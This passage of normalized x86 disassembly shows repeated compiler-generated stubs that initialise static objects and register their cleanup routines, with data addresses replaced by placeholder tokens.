mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_423eda
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401b4b
pop ebp
retn
sub_423eee
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_423efd
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401b82
pop ebp
retn
sub_423f11
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_423f20
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401bbc
pop ebp
retn
sub_423f34
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_423f43
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401bf6
pop ebp
retn
sub_423f57
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_42432d
call sub_402b39
pop ecx
pop ebp
retn
sub_423f71
push ebp
mov ebp esp
mov ecx rw-data
call sub_401068
push sub_42433c
call sub_402b39
pop ecx
pop ebp
retn
sub_423f8b
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_42434b
call sub_402b39
pop ecx
pop ebp
retn
sub_423fa5
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_42435a
call sub_402b39
pop ecx
pop ebp
retn
sub_423fbf
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_424369
call sub_402b39
pop ecx
pop ebp
retn
sub_423fd9
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_423fe8
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_401f4c
pop ebp
retn
sub_423ffc
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_42400b
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4020b8
pop ebp
retn
sub_42401f
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_42402e
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4020fc
pop ebp
retn
sub_424042
push ebp
mov ebp esp
mov ecx rw-data
call sub_401068
push sub_424378
call sub_402b39
pop ecx
pop ebp
retn
sub_42405c
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_42406b
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_402136
pop ebp
retn
sub_42407f
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_42408e
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_402170
pop ebp
retn
sub_4240a2
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_4240b1
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4021aa
pop ebp
retn
sub_4240c5
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_4240d4
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4021e4
pop ebp
retn
sub_4240e8
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_424387
call sub_402b39
pop ecx
pop ebp
retn
sub_424102
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_424396
call sub_402b39
pop ecx
pop ebp
retn
sub_42411c
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_4243a5
call sub_402b39
pop ecx
pop ebp
retn
sub_424136
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_424145
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4023bc
pop ebp
retn
sub_424159
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_424168
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_402400
pop ebp
retn
sub_42417c
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_42418b
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_40243a
pop ebp
retn
sub_42419f
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_402474
pop ebp
retn
sub_4241b3
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4024b5
pop ebp
retn
sub_4241c7
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_4024f6
pop ebp
retn
sub_4241db
push ebp
mov ebp esp
mov ecx rw-data
call sub_401068
push sub_4243b4
call sub_402b39
pop ecx
pop ebp
retn
sub_4241f5
push ebp
mov ebp esp
push 0x70737200
call sub_414299
push eax
mov ecx rw-data
call sub_40fbc4
push sub_4243c3
call sub_402b39
pop ecx
pop ebp
retn
sub_42421a
push ebp
mov ebp esp
mov ecx rw-data
call sub_401068
push sub_4243d2
call sub_402b39
pop ecx
pop ebp
retn
sub_424234
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_424243
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_402537
pop ebp
retn
sub_424257
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_4243e1
call sub_402b39
pop ecx
pop ebp
retn
sub_424271
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_4243f0
call sub_402b39
pop ecx
pop ebp
retn
sub_42428b
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push sub_4243ff
call sub_402b39
pop ecx
pop ebp
retn
sub_4242a5
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c30
push r-xdata
call sub_402b39
pop ecx
pop ebp
retn
sub_4242bf
push ebp
mov ebp esp
mov ecx rw-data
call sub_4012db
pop ebp
retn
sub_4242ce
push ebp
mov ebp esp
push rw-data
mov ecx rw-data
call sub_40264a
pop ebp
retn
sub_4242e2
push ebp
mov ebp esp
mov ecx rw-data
call sub_401116
pop ebp
retn
sub_4242f1
push ebp
mov ebp esp
mov ecx rw-data
call sub_41333d
pop ebp
retn
sub_424300
push ebp
mov ebp esp
mov ecx rw-data
call sub_40151c
pop ebp
retn
sub_42430f
push ebp
mov ebp esp
mov ecx rw-data
call sub_401652
pop ebp
retn
sub_42431e
push ebp
mov ebp esp
mov ecx rw-data
call sub_401780
pop ebp
retn
sub_42432d
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_42433c
push ebp
mov ebp esp
mov ecx rw-data
call sub_4010a3
pop ebp
retn
sub_42434b
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_42435a
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_424369
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_424378
push ebp
mov ebp esp
mov ecx rw-data
call sub_4010a3
pop ebp
retn
sub_424387
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_424396
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_4243a5
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_4243b4
push ebp
mov ebp esp
mov ecx rw-data
call sub_4010a3
pop ebp
retn
sub_4243c3
push ebp
mov ebp esp
mov ecx rw-data
call sub_40f7b3
pop ebp
retn
sub_4243d2
push ebp
mov ebp esp
mov ecx rw-data
call sub_4010a3
pop ebp
retn
sub_4243e1
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_4243f0
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
sub_4243ff
push ebp
mov ebp esp
mov ecx rw-data
call sub_401c6b
pop ebp
retn
